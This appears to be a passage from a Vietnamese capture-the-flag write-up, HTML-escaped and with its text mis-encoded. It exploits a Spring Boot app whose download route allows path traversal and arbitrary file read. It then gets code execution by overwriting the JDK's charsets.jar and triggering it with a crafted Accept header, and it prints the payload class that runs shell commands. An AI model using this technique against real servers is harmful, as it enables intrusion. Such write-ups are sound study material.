&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;public&lt;/span&gt; &lt;span class="n"&gt;ResponseEntity&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="ne"&gt;String&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;downloadResource&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;RequestParam&lt;/span&gt; &lt;span class="ne"&gt;String&lt;/span&gt; &lt;span class="n"&gt;fileName&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="ne"&gt;String&lt;/span&gt; &lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;try&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;bytes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Files&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;readAllBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Paths&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;uploads/&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;fileName&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="ne"&gt;String&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;catch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="n"&gt;var5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;ResponseEntity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HttpStatus&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;NOT_FOUND&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="ne"&gt;Object&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;MediaType&lt;/span&gt; &lt;span class="n"&gt;mediaType&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MediaType&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;parseMediaType&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;application/octet-stream&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;HttpHeaders&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;HttpHeaders&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setContentType&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mediaType&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setContentDispositionFormData&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;attachment&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fileName&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;ResponseEntity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;BodyBuilder&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;ResponseEntity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HttpStatus&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;OK&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Vá» cÆ¡ báº£n thÃ¬ chá»©c nÃ y Ä‘á»c file tá»« path upload ná»‘i chuá»—i vá»›i request param &lt;code&gt;fileName&lt;/code&gt;, tá»« Ä‘Ã³ expose lá»— há»•ng read file + path traversal&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ChÆ°Æ¡ng trÃ¬nh chá»‰ cÃ³ 2 route nÃ y lÃ  Ä‘Ã¡ng chÃº Ã½, vÃ¬ user cháº¡y web service lÃ  root nÃªn tá»•ng há»£p láº¡i mÃ¬nh Ä‘ang cÃ³:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Upload file tÃ¹y Ã½&lt;/li&gt;
&lt;li&gt;Read file tÃ¹y Ã½&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;TÆ°á»Ÿng ngon Äƒn nhÆ°ng láº¡i khÃ´ng há» ngon, ta khÃ´ng thá»ƒ upload web shell jsp vÃ¬ Spring Boot khÃ´ng code Ä‘á»ƒ phá»¥c vá»¥ viá»‡c hiá»ƒn thá»‹ thÆ° má»¥c uploads ra web, mÃ  chá»‰ cÃ³ thá»ƒ truy cáº­p Ä‘áº¿n thÃ´ng qua route &lt;code&gt;/file/downloadResource&lt;/code&gt;
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/BJTRQUtiC.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/HyK1EIYjA.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Tá»« Ä‘Ã³, mÃ¬nh Ä‘Ã£ thá»­ kha khÃ¡ cÃ¡ch, má»™t sá»‘ cÃ³ thá»ƒ nÃ³i Ä‘áº¿n lÃ :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Upload cÃ¡c file cÃ³ kháº£ nÄƒng tá»± Ä‘á»™ng thá»±c thi nhÆ° crontab, nhÆ°ng bá»‹ blacklist -&amp;gt; failed&lt;/li&gt;
&lt;li&gt;Upload ghi Ä‘Ã¨ html Ä‘á»ƒ trigger thymeleaf (maybe), nhÆ°ng chÆ°Æ¡ng trÃ¬nh Ä‘Æ°á»£c Ä‘Ã³ng gÃ³i thÃ nh file jar -&amp;gt; failed&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Searching tÃ i liá»‡u Trung Hoa vá» Spring boot upload file to RCE thÃ¬ mÃ¬nh tÃ¬m Ä‘Æ°á»£c lá»— há»•ng Spring boot Fat Jar táº¡i &lt;a class="link" href="https://download.csdn.net/download/weixin_42131316/16637359?ydreferer=aHR0cHM6Ly93d3cuYmFpZHUuY29tL2xpbms%2FdXJsPU1VOTZSR2sycjdmak11V0RiZkNRbWlSVG1zb2RPUzYtSmJyV1pPUEZGV0V2NFhhbXJPMWlmc1pfNUlFX2o4OUROLWxxcE81Xzc4c2tTR0tHWkw3WXpCZDcxaGY1R3d3OURZejVlYW9tR0l1JndkPSZlcWlkPTk2N2Y0ZGM1MDAzOThjZDkwMDAwMDAwNjY2Y2FjZGM4" target="_blank" rel="noopener"
&gt;csdn&lt;/a&gt;, tá»« Ä‘Ã³ dáº«n tá»›i blog &lt;a class="link" href="https://landgrey.me/blog/22/" target="_blank" rel="noopener"
&gt;https://landgrey.me/blog/22/&lt;/a&gt;, Ä‘Ã£ nÃ³i chi tiáº¿t vá» quÃ¡ trÃ¬nh tÃ¬m vÃ  khai thÃ¡c lá»— há»•ng, kÃ¨m lab Ä‘i kÃ¨m + file jar ghi Ä‘Ã¨.
Vá» cÆ¡ báº£n thÃ¬ lá»— há»•ng nÃ y cho phÃ©p ta Ä‘Æ°a tá»« ghi file báº¥t ká»³ lÃªn RCE thÃ´ng qua viá»‡c ghi Ä‘Ã¨ cÃ¡c file jar cÃ³ trong lib cá»§a JDK, tÃ¡c giáº£ lá»±a chá»n file charsets.jar vÃ¬ nÃ³ cÃ³ thá»ƒ trigger thÃ´ng qua header Accept táº¡i HTTP Request báº¥t ká»³
Äiá»u kiá»‡n Ä‘á»ƒ khai thÃ¡c lá»— há»•ng lÃ :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Biáº¿t Ä‘Æ°á»£c tÃªn thÆ° má»¥c lib cá»§a JDK, vá»›i phiÃªn báº£n Ä‘Æ°á»£c docker cÃ i Ä‘áº·t lÃ  &lt;code&gt;openjdk:8-jdk-alpine&lt;/code&gt; thÃ¬ nÃ³ sáº½ náº±m táº¡i: &lt;code&gt;/usr/lib/jvm/java-1.8-openjdk/jre/lib/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;File jar Ä‘Ã³ chÆ°a Ä‘Æ°á»£c server load Ä‘á»ƒ sá»­ dá»¥ng, váº­y nÃªn Ä‘Ã¢y lÃ  trÃ² chÆ¡i 1 láº§n, má»™t khi Ä‘Ã£ upload thÃ¬ náº¿u ta exploit khÃ´ng thÃ nh cÃ´ng sáº½ cáº§n pháº£i attack vÃ o lib khÃ¡c, hoáº·c Ä‘Æ¡n giáº£n hÆ¡n lÃ  deploy láº¡i Â¯\&lt;em&gt;(ãƒ„)&lt;/em&gt;/Â¯ (cháº¯c Ä‘Ã¢y cÅ©ng lÃ  lÃ½ do challenge nÃ y Ä‘Æ°á»£c deploy instance)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Cá»¥ thá»ƒ vá» file jar cÅ©ng nhÆ° cÃ¡c táº¥n cÃ´ng thÃ¬ náº±m táº¡i: &lt;a class="link" href="https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks/" target="_blank" rel="noopener"
&gt;https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks/&lt;/a&gt;. MÃ¬nh git clone vá» Ä‘á»ƒ láº¥y file jar cá»§a há» test thá»­ cÅ©ng nhÆ° tá»± build thÃ nh 1 project.
File jar cá»§a há» Ä‘Æ°á»£c build tá»« 2 file java class &lt;code&gt;ExtendedCharsets&lt;/code&gt; dÃ¹ng Ä‘á»ƒ khai bÃ¡o cÃ¡c kiá»ƒu charset, cÃ²n &lt;code&gt;IBM33722&lt;/code&gt; dÃ¹ng Ä‘á»ƒ xá»­ lÃ½ vá»›i cÃ¡c kiá»ƒu charset Ä‘Ã³.
Táº¡i &lt;code&gt;IBM33722.class&lt;/code&gt; ta sáº½ tháº¥y khi kiá»ƒu charset nÃ o Ä‘Æ°á»£c kÃ­ch hoáº¡t á»Ÿ bÃªn &lt;code&gt;ExtendedCharsets&lt;/code&gt; Ä‘á»u sáº½ thá»±c thi á»Ÿ file nÃ y, vÃ  khi khá»Ÿi táº¡o constructor cá»§a class &lt;code&gt;IBM33722&lt;/code&gt; sáº½ trigger method &lt;strong&gt;fun()&lt;/strong&gt; thá»±c thi cÃ¢u lá»‡nh. ÄÃ¢y lÃ  cÃ¢u lá»‡nh Ä‘Æ°á»£c thá»±c thi bÃªn trong file jar máº«u cá»§a há»:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;private&lt;/span&gt; &lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="n"&gt;HashMap&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="ne"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ne"&gt;String&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;fun&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="ne"&gt;String&lt;/span&gt; &lt;span class="n"&gt;var1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;UUID&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;randomUUID&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;toString&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;-&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;substring&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="ne"&gt;String&lt;/span&gt; &lt;span class="n"&gt;var2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getProperty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;os.name&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="ne"&gt;String&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;var0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;var2&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;startsWith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;Mac OS&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;var0&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="ne"&gt;String&lt;/span&gt;&lt;span class="p"&gt;[]{&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;-c&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;open -a Calculator&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;var2&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;startsWith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;Windows&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;var0&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="ne"&gt;String&lt;/span&gt;&lt;span class="p"&gt;[]{&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;cmd.exe&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;/c&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;calc&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="ne"&gt;File&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exists&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;var0&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="ne"&gt;String&lt;/span&gt;&lt;span class="p"&gt;[]{&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;-c&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;touch /tmp/charsets_test_&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;var1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;.log&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;var0&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="ne"&gt;String&lt;/span&gt;&lt;span class="p"&gt;[]{&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;-c&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;touch /tmp/charsets_test_&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;var1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;.log&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;try&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;Runtime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getRuntime&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;var0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;catch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Throwable&lt;/span&gt; &lt;span class="n"&gt;var4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;var4&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;printStackTrace&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Upload file jar ghi Ä‘Ã¨ file jar hiá»‡n táº¡i:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/HJuj_IYoA.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/HyFaOLKiC.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Trigger báº±ng request kÃ¨m header: &lt;code&gt;Accept: text/html;charset=GBK&lt;/code&gt;
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/Hk-8KIFj0.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Kiá»ƒm tra táº¡i docker thÃ¬ ta tháº¥y 2 file log Ä‘Ã£ Ä‘Æ°á»£c khá»Ÿi táº¡o, chá»©ng tá» ta Ä‘Ã£ RCE thÃ nh cÃ´ng:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/S1xp3Y8Fi0.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;h3 id="exploit-1"&gt;Exploit
&lt;/h3&gt;&lt;p&gt;Giá» cÃ´ng viá»‡c cá»§a mÃ¬nh lÃ  tá»± build láº¡i 1 file jar Ä‘á»ƒ thay vÃ¬ táº¡o file tmp mÃ¬nh sáº½ ghi flag vÃ o /tmp/flag.txt vÃ  rá»“i dÃ¹ng route downloadResource Ä‘á»ƒ Ä‘á»c flag
VÃ¬ chÆ°a build file jar tá»« artifacts bao giá» mÃ  mÃ¬nh hay dÃ¹ng maven Ä‘á»ƒ package nÃªn mÃ¬nh tá»‘n ráº¥t nhiá»u thá»i gian cho viá»‡c nÃ y (cá»¥ thá»ƒ lÃ  2 tiáº¿ng rÆ°á»¡i)
CÃ³ má»™t sá»‘ váº¥n Ä‘á» gáº·p pháº£i mÃ  mÃ¬nh lÆ°u Ã½:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;KhÃ´ng thá»ƒ nhÃ©t file .java vÃ o file jar vÃ¬ ta cáº§n lÃ  file java Ä‘Æ°á»£c compile thÃ nh file class&lt;/li&gt;
&lt;li&gt;Source code gen file jar cá»§a há» khÃ´ng cÃ³ main method, nÃªn Ä‘á»ƒ cháº¡y Ä‘Æ°á»£c ta cáº§n thÃªm method main vÃ o&lt;/li&gt;
&lt;li&gt;VÃ  cÅ©ng Ä‘á»«ng cÃ³ Ä‘i sá»­a source cá»§a há»™, tá»± build láº¡i tá»« source Ä‘Ã³ nhanh hÆ¡n nhiá»u =))&lt;/li&gt;
&lt;/ul&gt;
